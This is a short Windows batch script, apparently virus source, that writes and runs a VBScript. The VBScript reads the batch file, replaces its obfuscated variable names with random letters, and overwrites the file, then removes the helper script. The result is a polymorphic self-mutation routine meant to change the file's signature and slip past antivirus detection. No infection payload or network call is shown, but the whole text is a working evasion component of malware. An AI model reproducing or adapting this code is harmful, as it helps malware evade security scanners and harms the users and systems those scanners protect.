@set mhlcq=echo
@set ibhtl=copy

%mhlcq% set ff=createobject("scripting.filesystemobject")>>poly.vbs
%mhlcq% set rr=ff.opentextfile(%0,1)>>poly.vbs
%mhlcq% aa = rr.readall>>poly.vbs
%mhlcq% rr.close>>poly.vbs
%mhlcq% Randomize>>poly.vbs
%mhlcq% poly = int(rnd * 3)>>poly.vbs
%mhlcq% if poly = 0 or poly = 2 then>>poly.vbs
%mhlcq% s = chr(int(22 * rnd) + 97)>>poly.vbs
%mhlcq% rand1 = Replace(aa,"mhlcq","mhlcq" ^& s ^& poly)>>poly.vbs
%mhlcq% rand2 = Replace(rand1,"ibhtl","ibhtl" ^& s ^& s ^& poly)>>poly.vbs
%mhlcq% else>>poly.vbs
%mhlcq% polynum = int(rnd * 7)>>poly.vbs
%mhlcq% for i = 1 to polynum>>poly.vbs
%mhlcq% polychar = chr(int(22 * rnd) + 97)>>poly.vbs
%mhlcq% polyall = polyall + polychar>>poly.vbs
%mhlcq% next>>poly.vbs
%mhlcq% s = chr(int(22 * rnd) + 97)>>poly.vbs
%mhlcq% rand1 = Replace(aa,"mhlcq",polyall )>>poly.vbs
%mhlcq% rand2 = Replace(rand1,"ibhtl", s ^& polyall)>>poly.vbs
%mhlcq% end if>>poly.vbs
%mhlcq% set bb=ff.opentextfile(%0,2)>>poly.vbs
%mhlcq% bb.write rand2>>poly.vbs
@cscript poly.vbs
@del poly.vbs
@exit

